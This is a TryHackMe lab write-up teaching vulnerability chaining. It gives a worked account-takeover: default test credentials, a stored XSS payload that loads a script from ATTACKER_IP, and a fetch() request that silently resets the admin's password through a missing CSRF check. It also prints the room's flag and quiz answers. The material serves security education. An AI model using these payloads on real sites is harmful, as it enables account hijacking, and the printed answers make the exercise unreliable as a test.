---
title: "Chaining Vulnerabilities Tryhackme Writeups"
date: 2025-09-17
platform: tryhackme
source_file: "2025-09-17_Chaining-Vulnerabilities-Tryhackme-Writeups-327b8c2f827d.html"
---

---

### Chaining Vulnerabilities Tryhackme Writeups

#### **Author : Jawstar**

You can Follow me on Linkedin

[linkedin.com/in/abdul-wasay-jagirdar-b416822b4](https://www.linkedin.com/in/abdul-wasay-jagirdar-b416822b4)/

![](https://cdn-images-1.medium.com/max/800/0*ppVnFkp9US2MOCIo)

### Task 1 : Introduction

This brings us to something important that’s often overlooked when reading pentest reports: **risk ratings are assigned per vulnerability in isolation**. Organisations usually focus on remediating the criticals and highs, while deferring or accepting mediums and lows. But this mindset can be misleading. A medium-risk vulnerability like verbose error messages or weak password policy might not get immediate attention, but when chained together with other issues like missing CSRF protection or XSS, it could lead to a much higher-impact exploit. Sometimes, chaining multiple medium-rated issues results in a more damaging outcome than a single high-risk finding would have caused on its own.

Click me to proceed to the next task.

**No Answer Needed**

### Task 2 : Chaining Vulnerabilities

#### What is Vulnerability Chaining?

Vulnerability chaining is when two or more individual weaknesses are combined to cause greater damage than they could alone. Think of it like this: one vulnerability gets your foot in the door, another gives you access to sensitive functionality, and a third might let you execute code or exfiltrate data. None of them are particularly dangerous on their own, but together, they’re powerful.

Let’s look at a better example. Imagine you find a **Self-XSS** vulnerability in a user profile editor, the kind where the payload only runs in your own browser. On its own, that’s pretty limited; you can’t use it to target anyone else. But now imagine that the application also lacks CSRF protection. You craft a CSRF payload that forces an authenticated victim (like an admin) to unknowingly save your Self-XSS payload into their own profile. Later, when the admin views or edits their profile, the XSS fires, and now you’ve got code execution in their browser. Neither the Self-XSS nor the missing CSRF were critical on their own, but chained together, they give you full access to someone else’s session.

This is the essence of chaining: connecting lower-severity vulnerabilities to achieve something much more impactful.

### Why This Matters in the Real World

In real-world attacks, this approach is more common than most people expect. One of the best-known examples is the **Capital One breach in 2019**. The attacker didn’t rely on a critical zero-day. Instead, they began with a **Server-Side Request Forgery (SSRF)** vulnerability. On its own, that bug only allowed them to make HTTP requests from the server. However, that was enough to access the AWS EC2 metadata service, retrieve IAM credentials, and use those credentials to download sensitive files from an S3 bucket. None of these issues were individually critical, but the way they were chained led to a massive data breach.

Another common scenario: an attacker finds a page vulnerable to **SQL Injection**, but it’s behind a login. They also notice that the login form gives away whether a username exists, and that there’s no limit on login attempts. Using this, they discover a valid username, brute-force the weak password, and log in. Now authenticated, they exploit the SQLi to dump data or escalate privileges. Again, no single issue here is a guaranteed entry point, but together they build a clear path to compromise.

![](https://cdn-images-1.medium.com/max/800/0*Bd7OZP4CyzplJfHD.png)

### Why Patch-by-Patch Fixes Aren’t Enough

It’s common for development teams to fix vulnerabilities one at a time, treating them as isolated problems. They patch the SQLi, but leave the account enumeration alone. Or they fix a file upload issue, but leave the XSS that lets you abuse the upload feature. These fixes might close individual doors, but they don’t address the bigger picture, the system is still vulnerable because the *connections* between these bugs were never considered.

That’s why security needs to be approached **holistically**. Vulnerability chaining isn’t some edge case; it’s how real attacks happen. Attackers aren’t playing fair, and they aren’t following your bug tracker. They’re looking for whatever combination of flaws gets them to their goal, whether that’s access, persistence, or data.

Click me to proceed to the next task.

**No answer Needed**

### Task 3 : Methodology

**Step 1: Use the Application Like a Normal User**

Before anything else, explore the application with no assumptions. Register an account, log in, click around, and understand what features are available. Don’t go hunting for bugs yet. Just get a feel for the flow, the user roles, and where sensitive actions happen (e.g. account settings, admin features, uploads).

**Step 2: Enumerate and Find Weaknesses**

Now shift your focus to identifying weak spots. These might be classic vulnerabilities like SQLi, XSS, or IDOR, or subtler behaviours like inconsistent error messages, user ID patterns in URLs, or file uploads that allow weird extensions.

At this point, list all potential findings, even if they seem low-risk.

**Step 3: Understand What Each Finding Enables**

Once you’ve got a handful of weaknesses, assess them in isolation. Ask yourself:  
“What can I do with this if I assume nothing else is broken?”

* Does this XSS run in a useful context?
* Can this verbose login help with username enumeration?
* Will this file upload let me drop a script somewhere?

You’re trying to understand the standalone **potential** of each issue.

**Step 4: Think Like an Attacker, What’s the Goal?**

Now ask: What would an attacker want to do with this application?

* Steal sensitive data?
* Access an admin panel?
* Escalate to remote code execution?

Context matters. An XSS on a blog might be annoying, but on a banking dashboard? That’s a very different threat.

**Step 5: Build a Path from Weaknesses to Objective**

This is where you connect the dots. Look at your list of vulnerabilities and imagine a logical path from an external user to the attacker’s goal.

Example:

> *Verbose login → valid usernames → weak password policy → login → stored XSS → admin visits → XSS fires → admin cookie theft → privilege escalation*

The key is mapping out the **exploit path** step by step.

**Step 6: Execute and Validate Each Step**

Walk the chain in order. Don’t assume something will work; test it.

* Can you brute-force a password?
* Does your XSS trigger in the right context?
* Will the stolen cookie actually let you access the admin dashboard?

This also helps uncover blockers or dependencies. Maybe the XSS only works on certain pages, or the login brute-force fails because of rate limiting.

**Step 7: Report the Full Chain**

When reporting, don’t isolate the bugs. Tell the full story.

Start with “an unauthenticated attacker can do X”, and walk through the chain clearly. Make it obvious that the risk comes not from one bug, but from how they interact.

Also, be clear about the **impact escalation**:  
“While each individual issue might be low or medium risk, together they result in full compromise of the system.”

Click me to proceed to the next task.

**No Answer Needed**

### Task 4 : Guided Chain

**Step 1: Developer Test Credentials**

The first thing you do when approaching any login form is to try the easy stuff. In this case, the web application hosted at <http://MACHINE_IP/> has a test account left behind by the developer: `testuser` with the password `password123`. This isn't uncommon, devs often leave test data in place during staging, and if it makes its way into production, it's an easy win for attackers.

![](https://cdn-images-1.medium.com/max/800/0*oZjIUvW7ovziAZUV.png)

By logging in as this low-privileged user, you gain access to basic user features.

![](https://cdn-images-1.medium.com/max/800/0*nteK32CFo3lkzAzi.png)

**Step 2: Stored XSS in User Profile**

After logging in, you explore the edit profile page and notice that the “display name” field reflects input directly into the page without proper sanitisation. You try inserting a basic payload like `<script>alert(1)</script>`, and sure enough, it executes when the profile is viewed.

![](https://cdn-images-1.medium.com/max/800/0*DIAIFWsscHga8xCp.png)![](https://cdn-images-1.medium.com/max/800/0*jWTxPN6-z0frsrrI.png)

This is where the attacker mindset kicks in. The vulnerability is clear, but how can we use it to escalate? We know that an admin might view this profile (perhaps as part of a moderation flow), so now it’s about turning that into something actionable.

**Step 3: CSRF via XSS — Changing Admin Credentials**

Let’s pause and be clear: with a stored XSS like this, you could achieve account takeover entirely using JavaScript alone. You might read DOM content, extract CSRF tokens, and craft a legitimate request.

In our case, the application **doesn’t implement CSRF tokens at all**. That makes things simpler. When your XSS fires in the admin’s browser, you can just send a same-origin POST request to change the admin’s email and password, and the browser will attach cookies automatically.

![](https://cdn-images-1.medium.com/max/800/0*Z4Issv3hCFLgbSZY.png)

Here’s the script you can host on your attacker box:

**Note:** Save the script below as **script.js**

```
fetch('/update_email.php', {  
  method: 'POST',  
  credentials: 'include',  
  headers: {'Content-Type':'application/x-www-form-urlencoded'},  
  body: 'email=pwnedadmin@evil.local&password=pwnedadmin'  
});
```

Once the admin views your profile (with this script injected), their session will silently issue that request, and their credentials will be updated.

![](https://cdn-images-1.medium.com/max/800/0*QH92YCl4GahmHnDH.png)

To inject this, just set your display name to:

```
<script src="http://ATTACKER_IP:8000/script.js"></script>
```

Make sure your attacker machine is serving `script.js` with Python:

Terminal

```
user@tryhackme:~$ python3 -m http.server 8000  
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...  
MACHINE_IP - - [06/Jul/2025 20:14:05] "GET /script.js HTTP/1.1" 200 -
```

![](https://cdn-images-1.medium.com/max/800/0*9ecycb5-vb6sqN6Y.png)

**Step 4: Log in as Admin**

At this point, your XSS has done its job; the admin’s credentials were changed without them knowing. You can now log in as the admin using the password you set in the payload:

* **Username:** `admin`
* **Password:** `pwnedadmin`

![](https://cdn-images-1.medium.com/max/800/0*MxLoLJPA1RzjyFpl.png)

All the admin functionality is now available to you, because the application trusts that whoever is logged in with that account has the right to use those features. But you got here not by guessing the admin password, but by chaining smaller issues together: weak credentials, XSS, missing CSRF protection.

### Why Each Step Worked

At every stage, the attack succeeded because the application made assumptions that weren’t enforced:

* It assumed developer test accounts wouldn’t be left active.
* It assumed profile input wouldn’t be dangerous.
* It assumed authenticated requests from the browser must be legitimate.
* It assumed authentication was all you needed to access sensitive functions.

By chaining these together, you’ve taken what could have been minor issues in isolation and used them to achieve full compromise.

What is the flag in the admin panel?

***THM{57648b8e-3382–47bb-abbc-f125e128f8ab}***

What vulnerability enabled the attacker to force a change in the admin user’s password?

***Cross-site Scripting***

### Task 5 : Alternate Paths

![](https://cdn-images-1.medium.com/max/800/0*lVz68_Oml-u0O1Vo.png)

### Red Team vs Bug Bounty: Different Endgames

It’s also worth understanding that your goal can shape how you think about chaining. On a **red team engagement**, your job is to demonstrate impact holistically. You want to follow the chain as far as you can, ideally reaching your objective (such as domain admin or sensitive data access) without being detected. This means you might actually use your chain to pivot into internal systems, move laterally, or establish persistence.

On a **bug bounty**, the goal is different. Your job is to clearly show the risk and potential impact so the company can fix it. Sometimes, that means stopping before full exploitation because the report itself is enough to prove the point. For example, showing that you could change the admin’s email or that you could dump user data through SQLi is usually enough, you don’t need to go further.

![](https://cdn-images-1.medium.com/max/800/1*iIlpQUs3701zmXEiTzqR8Q.png)

Click me to proceed to the next task.

**No Answer Needed**

### Task 6 : Conclusion

By now, you’ve seen first-hand how vulnerabilities that might seem low-risk on their own can combine to cause serious damage. The key lesson from this walkthrough isn’t just that a default password, an XSS, or a missing CSRF token are problems, it’s that, together, they can lead all the way from a low-privileged account to full system compromise. Chaining is what turns small cracks into a breach.

One of the most important things to remember is that vulnerability chaining is about context, observation, and creativity. Each step in the chain worked because you spotted an opportunity and thought about what it could give you next. That’s what real attackers do: they follow the path the system unintentionally lays out for them, looking for ways to pivot and escalate at every turn.

It’s easy to get caught up in hunting for individual bugs, but chaining is what shows the real risk. That’s why in professional penetration tests and red team exercises, reports highlight how weaknesses combine, not just how they stand on their own. This mindset helps both attackers and defenders understand what needs to be fixed to truly reduce risk.

The next step is to apply what you’ve learned in other challenge rooms within this module. Now that you’ve seen how the process works, have a go at identifying your own chains. Remember: don’t just look for the critical bug, look for how small things fit together.

I can now chain vulnerabilities!

**No Answer Needed**
